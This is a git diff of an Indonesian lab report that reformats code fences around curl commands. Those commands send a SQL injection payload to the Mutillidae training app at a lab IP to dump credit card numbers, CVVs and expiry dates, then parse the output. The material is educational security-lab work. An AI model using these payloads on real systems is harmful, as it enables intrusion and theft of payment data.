@@ -112,17 +112,17 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/save_burp.png "Home page")
 3. Use Curl to Display Usernames and Passwords
    - Buka terminal, jalankan perintah berikut : 
- ```
+   ```
    curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
- ```
+   ```
 
 ## Perl Parser
    - Buka terminal, jalankan perintah berikut :
- ```
+   ```
    cd /root
    curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username="  > lesson8.txt
    cat lesson8.txt
- ```
+   ```
 
 ## Download Parser
    - Buka terminal, jalankan perintah berikut :
